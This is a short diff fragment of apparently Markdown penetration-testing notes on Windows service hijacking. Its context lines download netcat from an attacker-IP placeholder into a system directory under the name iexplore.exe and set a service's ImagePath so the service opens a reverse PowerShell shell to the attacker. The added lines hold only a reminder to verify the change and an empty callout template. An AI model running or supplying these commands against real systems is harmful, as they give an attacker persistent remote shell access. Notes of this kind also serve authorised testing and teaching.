@@ -150,3 +150,9 @@ wget http://<attackerip/netcat> -outfile C:\windows\system32\spool\drivers\color
 ```POWERSHELL
 SET-ITEMPROPERTY <SERVICE-PATH> -NAME ImagePath -value 'C:\windows\system32\spool\drivers\color\iexplore.exe <ATTACKER-IP> <PORT> -e powershell'
 ```
+
+**CROSS CHECK AND VERIFY THE CHANGE IN IMAGEPATH**
+
+
+> [!IF] Title
+> Contents
